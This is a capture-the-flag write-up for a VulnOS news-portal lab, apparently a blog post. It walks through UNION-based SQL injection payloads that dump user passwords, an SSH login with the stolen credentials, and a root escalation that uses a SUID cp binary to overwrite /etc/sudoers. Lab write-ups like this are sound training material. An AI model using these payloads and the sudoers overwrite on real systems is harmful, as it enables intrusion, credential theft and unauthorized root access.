# VulnOS "The Reporter's Access" Lab: From SQLi to Root 🗿

*Ever stumbled upon a “simple” news portal that turned out to be a full-on playground?*
That’s exactly what happened in this Vulnos Lab challenge. The journey? A **classic UNION-based SQL injection** to grab credentials, and a **SUID binary misstep** to snatch root.

Here’s how it went down — raw, step-by-step, with every command and output that made the dominoes fall.

**Lab Link: https://learn.vulnos.tech/lab/environment.html?id=68 <br/>**

![Cover](https://github.com/user-attachments/assets/6c1ddc0e-074a-4fed-856b-95bec57fbc04) <br/>

---

## Stage 1: Recon & Initial Access

We land on the CorpNet News Portal:

```
http://<LAB_IP>/
```

Pretty standard interface.

<img width="1915" height="677" alt="1" src="https://github.com/user-attachments/assets/526fe81b-1ffc-4398-8171-06e441ac9cec" /> <br/>

```
http://<LAB_IP>/article.php?id=1
```

<img width="1912" height="529" alt="2" src="https://github.com/user-attachments/assets/19b33ebd-3525-4e08-b585-2f702efd0e88" /> <br/>

### Testing for SQLi

Let’s break the logic:

```
http://10.0.128.20/article.php?id=1AND1%3D2
```

**Output:**

```
Database Error: SQLSTATE[42601]: Syntax error: 7 ERROR: syntax error at or near "AND1"
```

<img width="1918" height="507" alt="3" src="https://github.com/user-attachments/assets/d7df20db-fd7c-45a4-b4e0-c150415c7c42" /> <br/>

Nice — our input reached the database.

---

### Finding Column Count with ORDER BY

Incrementally:

```
?id=1 ORDER BY 1--   → Works
?id=1 ORDER BY 2--   → Works
?id=1 ORDER BY 3--   → Works
?id=1 ORDER BY 4--   → Works
?id=1 ORDER BY 5--   → Breaks!
```

<img width="1914" height="576" alt="4" src="https://github.com/user-attachments/assets/6d289d0f-306a-4b6f-b122-4910846fa6ea" /> <br/>
<img width="1913" height="453" alt="5" src="https://github.com/user-attachments/assets/423be341-72a5-4520-883a-97f4f0481d03" /> <br/>

**Conclusion: 4 columns.**

---

## Stage 1: Exfiltrating Credentials via UNION SQLi

First, dump attempt:

```
?id=-1 UNION SELECT username,password,null,null FROM users--
```

**Result:**

```
admin
Th1sP@ssw0rd1sH4rdT0Gu3ss!
```


<img width="1916" height="527" alt="6" src="https://github.com/user-attachments/assets/66609552-231c-43d8-ba08-2c29c823efff" /> <br/>

But only the **first row** shows.

### Enumerating Users by ID

We pivot:

```
?id=-1 UNION SELECT username,password,null,null FROM users WHERE id=1--
→ admin : Th1sP@ssw0rd1sH4rdT0Gu3ss!
```

<img width="1910" height="568" alt="7" src="https://github.com/user-attachments/assets/9c76ec87-7716-43ba-83db-e5b360e05e00" /> <br/>

```
?id=-1 UNION SELECT username,password,null,null FROM users WHERE id=2--
→ reporter : UnionSQLiIsFast!456
```

<img width="1918" height="570" alt="8" src="https://github.com/user-attachments/assets/6783a741-7fe5-4e81-bdce-fcfc6d2a755c" /> <br/>

Bingo — we’ve got **reporter** creds.

---

## Stage 1: Foothold Achieved

Tried admin via SSH — **denied.**

```
ssh admin@<LAB_IP>
Permission denied.
```

<img width="961" height="273" alt="9" src="https://github.com/user-attachments/assets/a6ff45f9-2575-4bf1-b0a8-1304b8a147dc" /> <br/>

Reporter? **In.**

```
ssh reporter@<LAB_IP>
```

<img width="1588" height="891" alt="10" src="https://github.com/user-attachments/assets/cf120a76-2379-442c-8037-c905a360067b" /> <br/>

**Flag:**

```
/home/reporter/user.txt
VULNOS{Uni0n_SQLi_f0r_th3_W1n!}
```

<img width="778" height="193" alt="11" src="https://github.com/user-attachments/assets/85c3d703-91ef-48fd-a7bf-60ac846a665b" /> <br/>

---

## Stage 2: Privilege Escalation via SUID Binary

### Hunting SUID Misconfigs

Run:

```
find / -perm -u=s -type f 2>/dev/null
```

<img width="1279" height="535" alt="12" src="https://github.com/user-attachments/assets/38a67986-ed7d-459c-8db3-272f6d2cf933" /> <br/>

**Suspicious result:** `/usr/bin/cp` — shouldn’t be SUID-root.

### Weaponizing `cp`

Create a malicious sudoers file:

```
echo "reporter ALL=(ALL) NOPASSWD: ALL" > /tmp/new_sudoers
/bin/cp /tmp/new_sudoers /etc/sudoers
sudo su
whoami
→ root
```

<img width="1221" height="157" alt="13" src="https://github.com/user-attachments/assets/29c2a69a-8d2f-411b-ab96-2752d6f431a6" /> <br/>

Final flag:

```
cat /root/root.txt
VULNOS{SUID_CP_f0r_th3_R00t_Pwn!}
```

<img width="1190" height="153" alt="14" src="https://github.com/user-attachments/assets/18165941-c17a-4774-aec8-f04f02b52730" /> <br/> <br/>
<img width="506" height="397" alt="Cover2" src="https://github.com/user-attachments/assets/e376d3ab-3255-480d-a2c4-485c35d0187a" /> <br/>

---

## Key Lessons 🐔

* **SQLi in numeric params** is still a thing — always test logical conditions first.
* **ORDER BY enumeration** is a low-noise, high-value recon trick.
* **SUID on core binaries** = instant privilege escalation path.

This lab was a reminder: *Sometimes, the old-school tricks work best.*

---

## Final Thoughts

Another day, another portal popped 🗿.
This challenge blended **classic web exploitation with post-exploitation misconfig hunting** — exactly the kind of full-chain attack paths that still plague real-world setups.

Want to practice these skills? **Labs like these are gold mines** — no shortcuts, just fundamentals in action.

---

*Written by **Aditya Bhatt** — VAPT Specialist, Ethical Hacker & Cybersecurity Writer* <br/>
*Top 2% TryHackMe | CEH | Security+ | AWS | Red Team Specialist*

---

